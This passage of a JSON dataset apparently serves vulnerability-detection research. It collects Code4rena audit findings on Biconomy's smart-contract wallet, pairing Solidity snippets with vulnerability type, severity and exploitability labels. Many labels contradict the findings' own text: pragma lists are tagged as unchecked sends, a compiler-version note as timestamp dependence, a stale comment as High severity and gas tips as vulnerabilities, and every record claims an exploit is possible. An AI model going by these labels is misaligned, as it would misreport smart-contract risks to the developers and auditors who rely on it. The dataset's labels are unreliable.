    "description": "contracts/smart-contract-wallet/BaseSmartAccount.sol::8 => import \"@account-abstraction/contracts/interfaces/IAccount.sol\"; contracts/smart-contract-wallet/BaseSmartAccount.sol::9 => import \"@account-abstraction/contracts/interfaces/IEntryPoint.sol\"; contracts/smart-contract-wallet/Proxy.sol::10 => /* This is the keccak-256 hash of \"biconomy.scw.proxy.implementation\" subtracted by 1, and is validated in the constructor */ contracts/smart-contract-wallet/Proxy.sol::16 => assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1)); contracts/smart-contract-wallet/SmartAccount.sol::5 => import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 92,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "contracts/smart-contract-wallet/SmartAccount.sol::198 => // initial gas = 21k + non_zero_bytes * 16 + zero_bytes * 4\ncontracts/smart-contract-wallet/SmartAccount.sol::199 => //            ~= 21k + calldata.length * [1/3 * 16 + 2/3 * 4]\ncontracts/smart-contract-wallet/SmartAccount.sol::200 => uint256 startGas = gasleft() + 21000 + msg.data.length * 8;\ncontracts/smart-contract-wallet/SmartAccount.sol::201 => //console.log(\"init %s\", 21000 + msg.data.length * 8);\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::198 => // initial gas = 21k + non_zero_bytes * 16 + zero_bytes * 4\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::199 => //            ~= 21k + calldata.length * [1/3 * 16 + 2/3 * 4]\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::200 => uint256 startGas = gasleft() + 21000 + msg.data.length * 8;\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::201 => //console.log(\"init %s\", 21000 + msg.data.length * 8);\ncontracts/smart-contract-wallet/aa-4337/samples/TokenPaymaster.sol::70 => function validatePaymasterUserOp(UserOperation calldata userOp, bytes32 /*userOpHash*/, uint256 requiredPreFund)\ncontracts/smart-contract-wallet/aa-4337/samples/VerifyingPaymaster.sol::56 => function validatePaymasterUserOp(UserOperation calldata userOp, bytes32 /*userOpHash*/, uint256 requiredPreFund)\ncontracts/smart-contract-wallet/aa-4337/test/TestOracle.sol::8 => return ethOutput * 2;\ncontracts/smart-contract-wallet/libs/Math.sol::35 => // (a + b) / 2 can overflow.\ncontracts/smart-contract-wallet/libs/Math.sol::36 => return (a & b) + (a ^ b) / 2;\ncontracts/smart-contract-wallet/libs/Math.sol::52 => * @dev Original credit to Remco Bloemen under MIT license (https://xn--2-umb.com/21/muldiv)\ncontracts/smart-contract-wallet/libs/Math.sol::63 => // variables such that product = prod1 * 2^256 + prod0.\ncontracts/smart-contract-wallet/libs/Math.sol::170 => // \u2192 `2**(k/2) <= sqrt(a) < 2**((k+1)/2) <= 2**(k/2 + 1)`\ncontracts/smart-contract-wallet/libs/Math.sol::172 => // Consequently, `2**(log2(a) / 2)` is a good first approximation of `sqrt(a)` with at least 1 correct bit.\ncontracts/smart-contract-wallet/libs/Math.sol::273 => if (value >= 10**8) {\ncontracts/smart-contract-wallet/libs/Math.sol::274 => value /= 10**8;\ncontracts/smart-contract-wallet/libs/Math.sol::277 => if (value >= 10**4) {\ncontracts/smart-contract-wallet/libs/Math.sol::278 => value /= 10**4;\ncontracts/smart-contract-wallet/libs/Math.sol::281 => if (value >= 10**2) {\ncontracts/smart-contract-wallet/libs/Math.sol::282 => value /= 10**2;\ncontracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::97 => function validatePaymasterUserOp(UserOperation calldata userOp, bytes32 /*userOpHash*/, uint256 requiredPreFund)",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "Findings:",
    "description": "contracts/smart-contract-wallet/SmartAccount.sol::198 => // initial gas = 21k + non_zero_bytes * 16 + zero_bytes * 4 contracts/smart-contract-wallet/SmartAccount.sol::199 => //            ~= 21k + calldata.length * [1/3 * 16 + 2/3 * 4] contracts/smart-contract-wallet/SmartAccount.sol::200 => uint256 startGas = gasleft() + 21000 + msg.data.length * 8; contracts/smart-contract-wallet/SmartAccount.sol::201 => //console.log(\"init %s\", 21000 + msg.data.length * 8); contracts/smart-contract-wallet/SmartAccountNoAuth.sol::198 => // initial gas = 21k + non_zero_bytes * 16 + zero_bytes * 4",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 24,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\ncontracts/smart-contract-wallet/aa-4337/samples/SimpleAccountForTokens.sol::17 => token.approve(paymaster, type(uint256).max);\ncontracts/smart-contract-wallet/test/StakedTestToken.sol::21 => IERC20(STAKED_TOKEN).transferFrom(msg.sender, address(this), amount);\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings:",
    "description": "contracts/smart-contract-wallet/aa-4337/samples/SimpleAccountForTokens.sol::17 => token.approve(paymaster, type(uint256).max); contracts/smart-contract-wallet/test/StakedTestToken.sol::21 => IERC20(STAKED_TOKEN).transferFrom(msg.sender, address(this), amount);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.262,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\ncontracts/smart-contract-wallet/aa-4337/core/BaseAccount.sol::2 => pragma solidity ^0.8.12;\ncontracts/smart-contract-wallet/aa-4337/core/BasePaymaster.sol::2 => pragma solidity ^0.8.12;\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::6 => pragma solidity ^0.8.12;\ncontracts/smart-contract-wallet/aa-4337/core/SenderCreator.sol::2 => pragma solidity ^0.8.12;\ncontracts/smart-contract-wallet/aa-4337/core/StakeManager.sol::2 => pragma solidity ^0.8.12;\ncontracts/smart-contract-wallet/aa-4337/interfaces/IAccount.sol::2 => pragma solidity ^0.8.12;\ncontracts/smart-contract-wallet/aa-4337/interfaces/IAggregatedAccount.sol::2 => pragma solidity ^0.8.12;\ncontracts/smart-contract-wallet/aa-4337/interfaces/IEntryPoint.sol::6 => pragma solidity ^0.8.12;\ncontracts/smart-contract-wallet/aa-4337/interfaces/IPaymaster.sol::2 => pragma solidity ^0.8.12;\ncontracts/smart-contract-wallet/aa-4337/interfaces/IStakeManager.sol::2 => pragma solidity ^0.8.12;\ncontracts/smart-contract-wallet/aa-4337/interfaces/UserOperation.sol::2 => pragma solidity ^0.8.12;\ncontracts/smart-contract-wallet/aa-4337/samples/DepositPaymaster.sol::2 => pragma solidity ^0.8.12;\ncontracts/smart-contract-wallet/aa-4337/samples/IOracle.sol::2 => pragma solidity ^0.8.12;\ncontracts/smart-contract-wallet/aa-4337/samples/SimpleAccount.sol::2 => pragma solidity ^0.8.12;\ncontracts/smart-contract-wallet/aa-4337/samples/SimpleAccountFactory.sol::2 => pragma solidity ^0.8.12;\ncontracts/smart-contract-wallet/aa-4337/samples/SimpleAccountForTokens.sol::2 => pragma solidity ^0.8.12;\ncontracts/smart-contract-wallet/aa-4337/samples/TestAggregatedAccount.sol::2 => pragma solidity ^0.8.12;\ncontracts/smart-contract-wallet/aa-4337/samples/TestAggregatedAccountFactory.sol::2 => pragma solidity ^0.8.12;\ncontracts/smart-contract-wallet/aa-4337/samples/TestSignatureAggregator.sol::2 => pragma solidity ^0.8.12;\ncontracts/smart-contract-wallet/aa-4337/samples/TokenPaymaster.sol::2 => pragma solidity ^0.8.12;\ncontracts/smart-contract-wallet/aa-4337/samples/VerifyingPaymaster.sol::2 => pragma solidity ^0.8.12;\ncontracts/smart-contract-wallet/aa-4337/test/TestCounter.sol::2 => pragma solidity ^0.8.12;\ncontracts/smart-contract-wallet/aa-4337/test/TestExpirePaymaster.sol::2 => pragma solidity ^0.8.12;\ncontracts/smart-contract-wallet/aa-4337/test/TestExpiryAccount.sol::2 => pragma solidity ^0.8.12;\ncontracts/smart-contract-wallet/aa-4337/test/TestOracle.sol::2 => pragma solidity ^0.8.12;\ncontracts/smart-contract-wallet/aa-4337/test/TestPaymasterAcceptAll.sol::2 => pragma solidity ^0.8.12;\ncontracts/smart-contract-wallet/aa-4337/test/TestToken.sol::2 => pragma solidity ^0.8.12;\ncontracts/smart-contract-wallet/aa-4337/test/TestUtil.sol::2 => pragma solidity ^0.8.12;\ncontracts/smart-contract-wallet/aa-4337/utils/Exec.sol::2 => pragma solidity >=0.7.5 <0.9.0;\ncontracts/smart-contract-wallet/paymasters/BasePaymaster.sol::2 => pragma solidity ^0.8.12;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings:",
    "description": "contracts/smart-contract-wallet/aa-4337/core/BaseAccount.sol::2 => pragma solidity ^0.8.12; contracts/smart-contract-wallet/aa-4337/core/BasePaymaster.sol::2 => pragma solidity ^0.8.12; contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::6 => pragma solidity ^0.8.12; contracts/smart-contract-wallet/aa-4337/core/SenderCreator.sol::2 => pragma solidity ^0.8.12; contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol::2 => pragma solidity ^0.8.12;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 32,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": " to avoid losing funding to the zero address.\n\nQA4: https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/common/Singleton.sol#L2\nLock all contracts to the most recent version of Solidity, 0.8.17.\n\nQA5. https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/handler/DefaultCallbackHandler.sol#L55-L61\nThe function should also indicate that it supports the interface of ",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "High",
    "title": "QA1. https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L397",
    "description": "There is a typo here, the comparison should be against ``type(uint128).max`` instead of ``type(uint120).max`` since the documentation says \"validate all numeric values in userOp are well below 128 bit\". require(maxGasValues <= type(uint128).max, \"AA94 gas values overflow\"); QA2: https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/paymasters/BasePaymaster.sol#L75 The modifier ``onlyOwner`` is not necessary, just like the ``deposit()`` function. QA3: https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/paymasters/BasePaymaster.sol#L99",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.538,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "paymasterIdBalances[msg.sender] -= amount;",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Gas",
    "title": "[G-2]: Place subtractions where the operands can't underflow in unchecked {} block",
    "description": "**Context:** **Description:** Some gas can be saved by using an unchecked {} block if an underflow isn't possible because of a previous require() or if-statement.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.042,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n449:    function transfer(address payable dest, uint amount) external nonReentrant onlyOwner {\n450:        require(dest != address(0), \"this action will burn your funds\");\n451:        (bool success,) = dest.call{value:amount}(\"\");\n452:        require(success,\"transfer failed\");\n453:    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "6. Contract existence checks",
    "description": "A low-level call could return success on a non-existent contract even if no function call was executed. For more info, see the following: [docs.soliditylang.org/en/v0.8.7/control-structures.html#error-handling-assert-require-revert-and-exceptions](https://docs.soliditylang.org/en/v0.8.7/control-structures.html#error-handling-assert-require-revert-and-exceptions) Here is an instance of this issue: File: `SmartAccount.sol` [Line 449-453](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L449-L453)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.298,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "VerifyingSingletonPaymaster.sol",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "9. Missing events for crucial functions",
    "description": "Consider adding events for crucial functions. If no events are added, off-chain tools will not work as expected. For instance, an event could be added for the following function to then emit: File: `VerifyingSingletonPaymaster.sol` [Line 65-68](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L65-L68)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.031,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n        return keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, getChainId(), address(this)));\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Low",
    "title": "10. Avoid using `this` without wrapping in `address()`",
    "description": "> Prior to version 0.5.0, Solidity allowed address members to be accessed by a contract instance, for example `this.balance`. This is now forbidden and an explicit conversion to address must be done: `address(this).balance`. Source: https://docs.soliditylang.org/en/v0.5.0/units-and-global-variables.html For example: File: `SmartAccount.sol` [Line 136](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L136) return keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, getChainId(), this));",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.103,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n42:    bytes32 internal constant DOMAIN_SEPARATOR_TYPEHASH = 0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218;\n\n48:    bytes32 internal constant ACCOUNT_TX_TYPEHASH = 0xc2595443c361a1f264c73470b9410fd67ac953ebd1a3ae63a2f514f3f014cf07;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "12. Long byte values are susceptible to human error",
    "description": "[`Singleton.sol`](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/common/Singleton.sol#L13) uses `assert()` to check the constant with its `bytes32()`. However, the following constants in `SmartAccount.sol` are not found to be doing such: File: `SmartAccount.sol` [Line 42](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L42), [Line 48](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L48) 42:    bytes32 internal constant DOMAIN_SEPARATOR_TYPEHASH = 0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218; 48:    bytes32 internal constant ACCOUNT_TX_TYPEHASH = 0xc2595443c361a1f264c73470b9410fd67ac953ebd1a3ae63a2f514f3f014cf07; Consider using `assert()` in the `constructor()` to verify the above constants.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.262,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nentryPoint = IEntryPoint(payable(_newEntryPoint));\nemit EntryPointChanged(address(_entryPoint), _newEntryPoint);\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[LOW-01]Change the order of emit",
    "description": "It should be build the IEntryPoint first, then emit the event. This is to prevent from issues when building IEntryPoint failed. **Proof Of Concept** https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L129-L130 **Recommended Mitigation Steps** Change it to:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.114,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": " function and can set the owner and entryPointAddress.\n\ninitializer doesn't cover the ownership issue. It can only make sure the function is only initialized once. https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/utils/Initializable.sol\n\n**Proof Of Concept**\nhttps://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L166-L176\n\n\n**Recommended Mitigation Steps**\n\nAdd the modifier of ",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "[LOW-03] Initilize() function can be called by anybody",
    "description": "Anyone has the access of ```init``` function and can set the owner and entryPointAddress. initializer doesn't cover the ownership issue. It can only make sure the function is only initialized once. https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/utils/Initializable.sol **Proof Of Concept** https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L166-L176 **Recommended Mitigation Steps**",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 11,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.479,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "require(b!=0, \"divisor should not be 0\");",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[LOW-04] Lack the validation that the divisor should not be 0.",
    "description": "If b is 0, the transaction will be reverted because there is no validation that b != 0. As it is a very basic function in math.sol, so we need to add a message to tell the customers why the transaction being reverted. **Proof Of Concept** https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/libs/Math.sol#L45-L47 **Recommended Mitigation Steps**",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.041,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "VerifyingSingletonPaymaster",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "High",
    "title": "**Description:**",
    "description": "Given some of the code has been forked from Gnosis Safe and Eth-Infinitism, there remain some relic references. For example, the `VerifyingSingletonPaymaster` should read 'the wallet signs to prove identity and account ownership'.",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.027,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "_IMPLEMENTATION_SLOT",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "**Description:**",
    "description": "Given the `Singleton` contract is utilising EIP-1967 storage, the comments regarding order of variable declaration affecting storage location are not accurate. The position of implementation address in storage does not follow Solidity's rules for storage layout and is instead fixed at the `_IMPLEMENTATION_SLOT`.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.02,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol\n\n477:    function _call(address target, uint256 value, bytes memory data) internal {\n478:        (bool success, bytes memory result) = target.call{value : value}(data);\n            if (!success) {\n                assembly {\n                    revert(add(result, 32), mload(result))\n                }\n            }\n        }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[NC-2] Missing checks for `address(0)` in low-level call",
    "description": "[Link to code](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L477-L484) File: https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol 477:    function _call(address target, uint256 value, bytes memory data) internal { 478:        (bool success, bytes memory result) = target.call{value : value}(data); if (!success) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.46,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/BaseAccount.sol\n\n2: pragma solidity ^0.8.12;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Low",
    "title": "[L-1] Unspecific compiler version pragma",
    "description": "Don\u2019t use\u00a0`pragma solidity ^0.8.12`\u00a0when you set the compiler version yourself. This makes it ambiguous to verifiers which version of solidity was used. Only use this pattern for library code where you are not the one to compile it. From security perspective there's always a trade-off between new code fixing known issues and potentially introducing new bugs in new releases. It is recommended to use a version that is released for a while instead of a nightly released version, i.e., to avoid from using `pragma solidity ^0.x.x;` or `pragma solidity >=0.8.12;`. In this project, it is recommended to use version 0.8.17. So the recommended compiler version pragma is: `pragma solidity 0.8.17;` [Link to code](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/BaseAccount.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.176,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n    function someFunction(address target, bytes memory calldata) external onlySpecificGroup {\n        ...some code...\n        _call(target, 0, calldata);\n    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "[L-2] `mixedAuth` modifier may have potential issues",
    "description": "Contract `SmartAccount` uses `mixedAuth` to protect privileged functions like `setOwner, updateImplementation, updateEntryPoint`. The modifier `mixedAuth` allows either the owner of the contract or the contract itself can access to these protected functions. However, in the current contract, there is no way for the contract itself to call these functions since there is no pre-coded code that can call these functions yet. If there is no plan to implement new code to enable the contract itself to call these privileged functions, it is a good practice to change `mixedAuth` to `onlyOwner`. This is because `mixedAuth` relaxes the restriction. It may unintentionally introduce risks to allow access to privileged functions. For example, if there is a need for a specific group of users to call an internal function `_call()` which makes low level call on provided address. The function may look like this: function someFunction(address target, bytes memory calldata) external onlySpecificGroup { ...some code...",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.169,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nEntryPoint.handleAggregatedOps(): for (uint256 i = 0; i < opasLen; i++);\nEntryPoint.handleAggregatedOps(): for (uint256 a = 0; a < opasLen; a++);\nEntryPoint.handleAggregatedOps(): for (uint256 i = 0; i < opslen; i++);\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "Increments should be unchecked",
    "description": "In Solidity 0.8+, there\u2019s a default overflow check on unsigned integers. It\u2019s possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline. Also increments can be made pre-increment instead of post-increment, so `i++` would become  `++i` where necessary. https://github.com/ethereum/solidity/issues/10695 Instances include: EntryPoint.handleAggregatedOps(): for (uint256 i = 0; i < opasLen; i++);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.227,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n2023-01-biconomy-main/contracts/smart-contract-wallet/Proxy.sol::16 => assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1));\n2023-01-biconomy-main/contracts/smart-contract-wallet/common/Singleton.sol::13 => assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1));\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy-main/contracts/smart-contract-wallet/Proxy.sol::16 => assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1)); 2023-01-biconomy-main/contracts/smart-contract-wallet/common/Singleton.sol::13 => assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1));",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.358,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::112 => owner = _newOwner;\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::172 => owner = _owner;\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountFactory.sol::19 => _defaultImpl = _baseImpl;\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::112 => owner = _newOwner;\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::172 => owner = _owner;\n",
    "vulnerability_label": 1,
